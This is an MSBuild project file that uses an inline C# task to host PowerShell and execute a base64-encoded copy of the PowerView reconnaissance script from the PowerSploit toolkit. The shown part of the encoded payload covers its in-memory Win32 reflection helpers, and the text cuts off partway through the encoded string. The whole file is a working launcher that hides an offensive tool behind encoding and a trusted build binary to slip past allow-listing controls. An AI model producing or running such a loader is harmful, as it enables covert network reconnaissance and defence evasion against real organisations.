<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
	<PropertyGroup>
		<FunctionName Condition="'$(FunctionName)' == ''">None</FunctionName>
		<Cmd Condition="'$(Cmd)' == ''">None</Cmd>
	</PropertyGroup>
	<Target Name="Hello">
		<FragmentExample />
		<ClassExample />
	</Target>
	<UsingTask TaskName="FragmentExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
		<ParameterGroup/>
		<Task>
			<Using Namespace="System" />
			<Using Namespace="System.IO" />
			<Code Type="Fragment" Language="cs">
				<![CDATA[ Console.WriteLine("PowerView"); ]]>
			</Code>
		</Task>
	</UsingTask>
	<UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
		<Task>
			<Reference Include="System.Management.Automation" />
			<Code Type="Class" Language="cs">
 <![CDATA[ using System; using System.IO; using System.Diagnostics; using System.Reflection; using System.Runtime.InteropServices; using System.Collections.ObjectModel; using System.Management.Automation; using System.Management.Automation.Runspaces; using System.Text; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class ClassExample : Task, ITask { public string funcName = "$(FunctionName)"; public string Cmd = "$(Cmd)"; public override bool Execute() { string encScript = "I3JlcXVpcmVzIC12ZXJzaW9uIDIKCjwjCgpQb3dlclNwbG9pdCBGaWxlOiBQb3dlclZpZXcucHMxCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KQpMaWNlbnNlOiBCU0QgMy1DbGF1c2UKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lCgojPgoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMKIyBQU1JlZmxlY3QgY29kZSBmb3IgV2luZG93cyBBUEkgYWNjZXNzCiMgQXV0aG9yOiBAbWF0dGlmZXN0YXRpb24KIyAgIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tYXR0aWZlc3RhdGlvbi9QU1JlZmxlY3QvbWFzdGVyL1BTUmVmbGVjdC5wc20xCiMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIE5ldy1Jbk1lbW9yeU1vZHVsZSB7CjwjCi5TWU5PUFNJUwoKQ3JlYXRlcyBhbiBpbi1tZW1vcnkgYXNzZW1ibHkgYW5kIG1vZHVsZQoKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKCi5ERVNDUklQVElPTgoKV2hlbiBkZWZpbmluZyBjdXN0b20gZW51bXMsIHN0cnVjdHMsIGFuZCB1bm1hbmFnZWQgZnVuY3Rpb25zLCBpdCBpcwpuZWNlc3NhcnkgdG8gYXNzb2NpYXRlIHRvIGFuIGFzc2VtYmx5IG1vZHVsZS4gVGhpcyBoZWxwZXIgZnVuY3Rpb24KY3JlYXRlcyBhbiBpbi1tZW1vcnkgbW9kdWxlIHRoYXQgY2FuIGJlIHBhc3NlZCB0byB0aGUgJ2VudW0nLAonc3RydWN0JywgYW5kIEFkZC1XaW4zMlR5cGUgZnVuY3Rpb25zLgoKLlBBUkFNRVRFUiBNb2R1bGVOYW1lCgpTcGVjaWZpZXMgdGhlIGRlc2lyZWQgbmFtZSBmb3IgdGhlIGluLW1lbW9yeSBhc3NlbWJseSBhbmQgbW9kdWxlLiBJZgpNb2R1bGVOYW1lIGlzIG5vdCBwcm92aWRlZCwgaXQgd2lsbCBkZWZhdWx0IHRvIGEgR1VJRC4KCi5FWEFNUExFCgokTW9kdWxlID0gTmV3LUluTWVtb3J5TW9kdWxlIC1Nb2R1bGVOYW1lIFdpbjMyCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1vZHVsZU5hbWUgPSBbR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpCiAgICApCgogICAgJEFwcERvbWFpbiA9IFtSZWZsZWN0aW9uLkFzc2VtYmx5XS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uQXBwRG9tYWluJykuR2V0UHJvcGVydHkoJ0N1cnJlbnREb21haW4nKS5HZXRWYWx1ZSgkbnVsbCwgQCgpKQogICAgJExvYWRlZEFzc2VtYmxpZXMgPSAkQXBwRG9tYWluLkdldEFzc2VtYmxpZXMoKQoKICAgIGZvcmVhY2ggKCRBc3NlbWJseSBpbiAkTG9hZGVkQXNzZW1ibGllcykgewogICAgICAgIGlmICgkQXNzZW1ibHkuRnVsbE5hbWUgLWFuZCAoJEFzc2VtYmx5LkZ1bGxOYW1lLlNwbGl0KCcsJylbMF0gLWVxICRNb2R1bGVOYW1lKSkgewogICAgICAgICAgICByZXR1cm4gJEFzc2VtYmx5CiAgICAgICAgfQogICAgfQoKICAgICREeW5Bc3NlbWJseSA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJE1vZHVsZU5hbWUpCiAgICAkRG9tYWluID0gJEFwcERvbWFpbgogICAgJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5Bc3NlbWJseSwgJ1J1bicpCiAgICAkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgkTW9kdWxlTmFtZSwgJEZhbHNlKQoKICAgIHJldHVybiAkTW9kdWxlQnVpbGRlcgp9CgoKIyBBIGhlbHBlciBmdW5jdGlvbiB1c2VkIHRvIHJlZHVjZSB0eXBpbmcgd2hpbGUgZGVmaW5pbmcgZnVuY3Rpb24KIyBwcm90b3R5cGVzIGZvciBBZGQtV2luMzJUeXBlLgpmdW5jdGlvbiBmdW5jIHsKICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERsbE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW3N0cmluZ10KICAgICAgICAkRnVuY3Rpb25OYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtUeXBlXQogICAgICAgICRSZXR1cm5UeXBlLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMyldCiAgICAgICAgW1R5cGVbXV0KICAgICAgICAkUGFyYW1ldGVyVHlwZXMsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0KV0KICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb25dCiAgICAgICAgJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNSldCiAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXRdCiAgICAgICAgJENoYXJzZXQsCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEVudHJ5UG9pbnQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNldExhc3RFcnJvcgogICAgKQoKICAgICRQcm9wZXJ0aWVzID0gQHsKICAgICAgICBEbGxOYW1lID0gJERsbE5hbWUKICAgICAgICBGdW5jdGlvbk5hbWUgPSAkRnVuY3Rpb25OYW1lCiAgICAgICAgUmV0dXJuVHlwZSA9ICRSZXR1cm5UeXBlCiAgICB9CgogICAgaWYgKCRQYXJhbWV0ZXJUeXBlcykgeyAkUHJvcGVydGllc1snUGFyYW1ldGVyVHlwZXMnXSA9ICRQYXJhbWV0ZXJUeXBlcyB9CiAgICBpZiAoJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uKSB7ICRQcm9wZXJ0aWVzWydOYXRpdmVDYWxsaW5nQ29udmVudGlvbiddID0gJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uIH0KICAgIGlmICgkQ2hhcnNldCkgeyAkUHJvcGVydGllc1snQ2hhcnNldCddID0gJENoYXJzZXQgfQogICAgaWYgKCRTZXRMYXN0RXJyb3IpIHsgJFByb3BlcnRpZXNbJ1NldExhc3RFcnJvciddID0gJFNldExhc3RFcnJvciB9CiAgICBpZiAoJEVudHJ5UG9pbnQpIHsgJFByb3BlcnRpZXNbJ0VudHJ5UG9pbnQnXSA9ICRFbnRyeVBvaW50IH0KCiAgICBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSAkUHJvcGVydGllcwp9CgoKZnVuY3Rpb24gQWRkLVdpbjMyVHlwZQp7CjwjCi5TWU5PUFNJUwoKQ3JlYXRlcyBhIC5ORVQgdHlwZSBmb3IgYW4gdW5tYW5hZ2VkIFdpbjMyIGZ1bmN0aW9uLgoKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IGZ1bmMKCi5ERVNDUklQVElPTgoKQWRkLVdpbjMyVHlwZSBlbmFibGVzIHlvdSB0byBlYXNpbHkgaW50ZXJhY3Qgd2l0aCB1bm1hbmFnZWQgKGkuZS4KV2luMzIgdW5tYW5hZ2VkKSBmdW5jdGlvbnMgaW4gUG93ZXJTaGVsbC4gQWZ0ZXIgcHJvdmlkaW5nCkFkZC1XaW4zMlR5cGUgd2l0aCBhIGZ1bmN0aW9uIHNpZ25hdHVyZSwgYSAuTkVUIHR5cGUgaXMgY3JlYXRlZAp1c2luZyByZWZsZWN0aW9uIChpLmUuIGNzYy5leGUgaXMgbmV2ZXIgY2FsbGVkIGxpa2Ugd2l0aCBBZGQtVHlwZSkuCgpUaGUgJ2Z1bmMnIGhlbHBlciBmdW5jdGlvbiBjYW4gYmUgdXNlZCB0byByZWR1Y2UgdHlwaW5nIHdoZW4gZGVmaW5pbmcKbXVsdGlwbGUgZnVuY3Rpb24gZGVmaW5pdGlvbnMuCgouUEFSQU1FVEVSIERsbE5hbWUKClRoZSBuYW1lIG9mIHRoZSBETEwuCgouUEFSQU1FVEVSIEZ1bmN0aW9uTmFtZQoKVGhlIG5hbWUgb2YgdGhlIHRhcmdldCBmdW5jdGlvbi4KCi5QQVJBTUVURVIgRW50cnlQb2ludAoKVGhlIERMTCBleHBvcnQgZnVuY3Rpb24gbmFtZS4gVGhpcyBhcmd1bWVudCBzaG91bGQgYmUgc3BlY2lmaWVkIGlmIHRoZQpzcGVjaWZpZWQgZnVuY3Rpb24gbmFtZSBpcyBkaWZmZXJlbnQgdGhhbiB0aGUgbmFtZSBvZiB0aGUgZXhwb3J0ZWQKZnVuY3Rpb24uCgouUEFSQU1FVEVSIFJldHVyblR5cGUKClRoZSByZXR1cm4gdHlwZSBvZiB0aGUgZnVuY3Rpb24uCgouUEFSQU1FVEVSIFBhcmFtZXRlclR5cGVzCgpUaGUgZnVuY3Rpb24gcGFyYW1ldGVycy4KCi5QQVJBTUVURVIgTmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24KClNwZWNpZmllcyB0aGUgbmF0aXZlIGNhbGxpbmcgY29udmVudGlvbiBvZiB0aGUgZnVuY3Rpb24uIERlZmF1bHRzIHRvCnN0ZGNhbGwuCgouUEFSQU1FVEVSIENoYXJzZXQKCklmIHlvdSBuZWVkIHRvIGV4cGxpY2l0bHkgY2FsbCBhbiAnQScgb3IgJ1cnIFdpbjMyIGZ1bmN0aW9uLCB5b3UgY2FuCnNwZWNpZnkgdGhlIGNoYXJhY3RlciBzZXQuCgouUEFSQU1FVEVSIFNldExhc3RFcnJvcgoKSW5kaWNhdGVzIHdoZXRoZXIgdGhlIGNhbGxlZSBjYWxscyB0aGUgU2V0TGFzdEVycm9yIFdpbjMyIEFQSQpmdW5jdGlvbiBiZWZvcmUgcmV0dXJuaW5nIGZyb20gdGhlIGF0dHJpYnV0ZWQgbWV0aG9kLgoKLlBBUkFNRVRFUiBNb2R1bGUKClRoZSBpbi1tZW1vcnkgbW9kdWxlIHRoYXQgd2lsbCBob3N0IHRoZSBmdW5jdGlvbnMuIFVzZQpOZXctSW5NZW1vcnlNb2R1bGUgdG8gZGVmaW5lIGFuIGluLW1lbW9yeSBtb2R1bGUuCgouUEFSQU1FVEVSIE5hbWVzcGFjZQoKQW4gb3B0aW9uYWwgbmFtZXNwYWNlIHRvIHByZXBlbmQgdG8gdGhlIHR5cGUuIEFkZC1XaW4zMlR5cGUgZGVmYXVsdHMKdG8gYSBuYW1lc3BhY2UgY29uc2lzdGluZyBvbmx5IG9mIHRoZSBuYW1lIG9mIHRoZSBETEwuCgouRVhBTVBMRQoKJE1vZCA9IE5ldy1Jbk1lbW9yeU1vZHVsZSAtTW9kdWxlTmFtZSBXaW4zMgoKJEZ1bmN0aW9uRGVmaW5pdGlvbnMgPSBAKAogIChmdW5jIGtlcm5lbDMyIEdldFByb2NBZGRyZXNzIChbSW50UHRyXSkgQChbSW50UHRyXSwgW1N0cmluZ10pIC1DaGFyc2V0IEFuc2kgLVNldExhc3RFcnJvciksCiAgKGZ1bmMga2VybmVsMzIgR2V0TW9kdWxlSGFuZGxlIChbSW50cHRyXSkgQChbU3RyaW5nXSkgLVNldExhc3RFcnJvciksCiAgKGZ1bmMgbnRkbGwgUnRsR2V0Q3VycmVudFBlYiAoW0ludFB0cl0pIEAoKSkKKQoKJFR5cGVzID0gJEZ1bmN0aW9uRGVmaW5pdGlvbnMgfCBBZGQtV2luMzJUeXBlIC1Nb2R1bGUgJE1vZCAtTmFtZXNwYWNlICdXaW4zMicKJEtlcm5lbDMyID0gJFR5cGVzWydrZXJuZWwzMiddCiROdGRsbCA9ICRUeXBlc1snbnRkbGwnXQokTnRkbGw6OlJ0bEdldEN1cnJlbnRQZWIoKQokbnRkbGxiYXNlID0gJEtlcm5lbDMyOjpHZXRNb2R1bGVIYW5kbGUoJ250ZGxsJykKJEtlcm5lbDMyOjpHZXRQcm9jQWRkcmVzcygkbnRkbGxiYXNlLCAnUnRsR2V0Q3VycmVudFBlYicpCgouTk9URVMKCkluc3BpcmVkIGJ5IExlZSBIb2xtZXMnIEludm9rZS1XaW5kb3dzQXBpIGh0dHA6Ly9wb3NoY29kZS5vcmcvMjE4OQoKV2hlbiBkZWZpbmluZyBtdWx0aXBsZSBmdW5jdGlvbiBwcm90b3R5cGVzLCBpdCBpcyBpZGVhbCB0byBwcm92aWRlCkFkZC1XaW4zMlR5cGUgd2l0aCBhbiBhcnJheSBvZiBmdW5jdGlvbiBzaWduYXR1cmVzLiBUaGF0IHdheSwgdGhleQphcmUgYWxsIGluY29ycG9yYXRlZCBpbnRvIHRoZSBzYW1lIGluLW1lbW9yeSBtb2R1bGUuCiM+CgogICAgW091dHB1dFR5cGUoW0hhc2h0YWJsZV0pXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERsbE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdW5jdGlvbk5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRW50cnlQb2ludCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtUeXBlXQogICAgICAgICRSZXR1cm5UeXBlLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtUeXBlW11dCiAgICAgICAgJFBhcmFtZXRlclR5cGVzLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DYWxsaW5nQ29udmVudGlvbl0KICAgICAgICAkTmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24gPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb25dOjpTdGRDYWxsLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0XQogICAgICAgICRDaGFyc2V0ID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXRdOjpBdXRvLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNldExhc3RFcnJvciwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7KCRfIC1pcyBbUmVmbGVjdGlvbi5FbWl0Lk1vZHVsZUJ1aWxkZXJdKSAtb3IgKCRfIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pfSldCiAgICAgICAgJE1vZHVsZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbCgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE5hbWVzcGFjZSA9ICcnCiAgICApCgogICAgQkVHSU4KICAgIHsKICAgICAgICAkVHlwZUhhc2ggPSBAe30KICAgIH0KCiAgICBQUk9DRVNTCiAgICB7CiAgICAgICAgaWYgKCRNb2R1bGUgLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSkKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkTmFtZXNwYWNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkVHlwZUhhc2hbJERsbE5hbWVdID0gJE1vZHVsZS5HZXRUeXBlKCIkTmFtZXNwYWNlLiREbGxOYW1lIikKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRUeXBlSGFzaFskRGxsTmFtZV0gPSAkTW9kdWxlLkdldFR5cGUoJERsbE5hbWUpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgIyBEZWZpbmUgb25lIHR5cGUgZm9yIGVhY2ggRExMCiAgICAgICAgICAgIGlmICghJFR5cGVIYXNoLkNvbnRhaW5zS2V5KCREbGxOYW1lKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCROYW1lc3BhY2UpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFR5cGVIYXNoWyREbGxOYW1lXSA9ICRNb2R1bGUuRGVmaW5lVHlwZSgiJE5hbWVzcGFjZS4kRGxsTmFtZSIsICdQdWJsaWMsQmVmb3JlRmllbGRJbml0JykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkVHlwZUhhc2hbJERsbE5hbWVdID0gJE1vZHVsZS5EZWZpbmVUeXBlKCREbGxOYW1lLCAnUHVibGljLEJlZm9yZUZpZWxkSW5pdCcpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRNZXRob2QgPSAkVHlwZUhhc2hbJERsbE5hbWVdLkRlZmluZU1ldGhvZCgKICAgICAgICAgICAgICAgICRGdW5jdGlvbk5hbWUsCiAgICAgICAgICAgICAgICAnUHVibGljLFN0YXRpYyxQaW52b2tlSW1wbCcsCiAgICAgICAgICAgICAgICAkUmV0dXJuVHlwZSwKICAgICAgICAgICAgICAgICRQYXJhbWV0ZXJUeXBlcykKCiAgICAgICAgICAgICMgTWFrZSBlYWNoIEJ5UmVmIHBhcmFtZXRlciBhbiBPdXQgcGFyYW1ldGVyCiAgICAgICAgICAgICRpID0gMQogICAgICAgICAgICBmb3JlYWNoKCRQYXJhbWV0ZXIgaW4gJFBhcmFtZXRlclR5cGVzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFBhcmFtZXRlci5Jc0J5UmVmKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFt2b2lkXSAkTWV0aG9kLkRlZmluZVBhcmFtZXRlcigkaSwgJ091dCcsICRudWxsKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRpKysKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJERsbEltcG9ydCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5EbGxJbXBvcnRBdHRyaWJ1dGVdCiAgICAgICAgICAgICRTZXRMYXN0RXJyb3JGaWVsZCA9ICREbGxJbXBvcnQuR2V0RmllbGQoJ1NldExhc3RFcnJvcicpCiAgICAgICAgICAgICRDYWxsaW5nQ29udmVudGlvbkZpZWxkID0gJERsbEltcG9ydC5HZXRGaWVsZCgnQ2FsbGluZ0NvbnZlbnRpb24nKQogICAgICAgICAgICAkQ2hhcnNldEZpZWxkID0gJERsbEltcG9ydC5HZXRGaWVsZCgnQ2hhclNldCcpCiAgICAgICAgICAgICRFbnRyeVBvaW50RmllbGQgPSAkRGxsSW1wb3J0LkdldEZpZWxkKCdFbnRyeVBvaW50JykKICAgICAgICAgICAgaWYgKCRTZXRMYXN0RXJyb3IpIHsgJFNMRVZhbHVlID0gJFRydWUgfSBlbHNlIHsgJFNMRVZhbHVlID0gJEZhbHNlIH0KCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0VudHJ5UG9pbnQnXSkgeyAkRXhwb3J0ZWRGdW5jTmFtZSA9ICRFbnRyeVBvaW50IH0gZWxzZSB7ICRFeHBvcnRlZEZ1bmNOYW1lID0gJEZ1bmN0aW9uTmFtZSB9CgogICAgICAgICAgICAjIEVxdWl2YWxlbnQgdG8gQyMgdmVyc2lvbiBvZiBbRGxsSW1wb3J0KERsbE5hbWUpXQogICAgICAgICAgICAkQ29uc3RydWN0b3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0QXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcihbU3RyaW5nXSkKICAgICAgICAgICAgJERsbEltcG9ydEF0dHJpYnV0ZSA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9yLAogICAgICAgICAgICAgICAgJERsbE5hbWUsIFtSZWZsZWN0aW9uLlByb3BlcnR5SW5mb1tdXSBAKCksIFtPYmplY3RbXV0gQCgpLAogICAgICAgICAgICAgICAgW1JlZmxlY3Rpb24uRmllbGRJbmZvW11dIEAoJFNldExhc3RFcnJvckZpZWxkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJENhbGxpbmdDb252ZW50aW9uRmllbGQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ2hhcnNldEZpZWxkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEVudHJ5UG9pbnRGaWVsZCksCiAgICAgICAgICAgICAgICBbT2JqZWN0W11dIEAoJFNMRVZhbHVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIChbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb25dICROYXRpdmVDYWxsaW5nQ29udmVudGlvbiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0XSAkQ2hhcnNldCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEV4cG9ydGVkRnVuY05hbWUpKQoKICAgICAgICAgICAgJE1ldGhvZC5TZXRDdXN0b21BdHRyaWJ1dGUoJERsbEltcG9ydEF0dHJpYnV0ZSkKICAgICAgICB9CiAgICB9CgogICAgRU5ECiAgICB7CiAgICAgICAgaWYgKCRNb2R1bGUgLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiAkVHlwZUhhc2gKICAgICAgICB9CgogICAgICAgICRSZXR1cm5UeXBlcyA9IEB7fQoKICAgICAgICBmb3JlYWNoICgkS2V5IGluICRUeXBlSGFzaC5LZXlzKQogICAgICAgIHsKICAgICAgICAgICAgJFR5cGUgPSAkVHlwZUhhc2hbJEtleV0uQ3JlYXRlVHlwZSgpCgogICAgICAgICAgICAkUmV0dXJuVHlwZXNbJEtleV0gPSAkVHlwZQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRSZXR1cm5UeXBlcwogICAgfQp9CgoKZnVuY3Rpb24gcHNlbnVtIHsKPCMKLlNZTk9QU0lTCgpDcmVhdGVzIGFuIGluLW1lbW9yeSBlbnVtZXJhdGlvbiBmb3IgdXNlIGluIHlvdXIgUG93ZXJTaGVsbCBzZXNzaW9uLgoKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKCi5ERVNDUklQVElPTgoKVGhlICdwc2VudW0nIGZ1bmN0aW9uIGZhY2lsaXRhdGVzIHRoZSBjcmVhdGlvbiBvZiBlbnVtcyBlbnRpcmVseSBpbgptZW1vcnkgdXNpbmcgYXMgY2xvc2UgdG8gYSAiQyBzdHlsZSIgYXMgUG93ZXJTaGVsbCB3aWxsIGFsbG93LgoKLlBBUkFNRVRFUiBNb2R1bGUKClRoZSBpbi1tZW1vcnkgbW9kdWxlIHRoYXQgd2lsbCBob3N0IHRoZSBlbnVtLiBVc2UKTmV3LUluTWVtb3J5TW9kdWxlIHRvIGRlZmluZSBhbiBpbi1tZW1vcnkgbW9kdWxlLgoKLlBBUkFNRVRFUiBGdWxsTmFtZQoKVGhlIGZ1bGx5LXF1YWxpZmllZCBuYW1lIG9mIHRoZSBlbnVtLgoKLlBBUkFNRVRFUiBUeXBlCgpUaGUgdHlwZSBvZiBlYWNoIGVudW0gZWxlbWVudC4KCi5QQVJBTUVURVIgRW51bUVsZW1lbnRzCgpBIGhhc2h0YWJsZSBvZiBlbnVtIGVsZW1lbnRzLgoKLlBBUkFNRVRFUiBCaXRmaWVsZAoKU3BlY2lmaWVzIHRoYXQgdGhlIGVudW0gc2hvdWxkIGJlIHRyZWF0ZWQgYXMgYSBiaXRmaWVsZC4KCi5FWEFNUExFCgokTW9kID0gTmV3LUluTWVtb3J5TW9kdWxlIC1Nb2R1bGVOYW1lIFdpbjMyCgokSW1hZ2VTdWJzeXN0ZW0gPSBwc2VudW0gJE1vZCBQRS5JTUFHRV9TVUJTWVNURU0gVUludDE2IEB7CiAgICBVTktOT1dOID0gICAgICAgICAgICAgICAgICAwCiAgICBOQVRJVkUgPSAgICAgICAgICAgICAgICAgICAxICMgSW1hZ2UgZG9lc24ndCByZXF1aXJlIGEgc3Vic3lzdGVtLgogICAgV0lORE9XU19HVUkgPSAgICAgICAgICAgICAgMiAjIEltYWdlIHJ1bnMgaW4gdGhlIFdpbmRvd3MgR1VJIHN1YnN5c3RlbS4KICAgIFdJTkRPV1NfQ1VJID0gICAgICAgICAgICAgIDMgIyBJbWFnZSBydW5zIGluIHRoZSBXaW5kb3dzIGNoYXJhY3RlciBzdWJzeXN0ZW0uCiAgICBPUzJfQ1VJID0gICAgICAgICAgICAgICAgICA1ICMgSW1hZ2UgcnVucyBpbiB0aGUgT1MvMiBjaGFyYWN0ZXIgc3Vic3lzdGVtLgogICAgUE9TSVhfQ1VJID0gICAgICAgICAgICAgICAgNyAjIEltYWdlIHJ1bnMgaW4gdG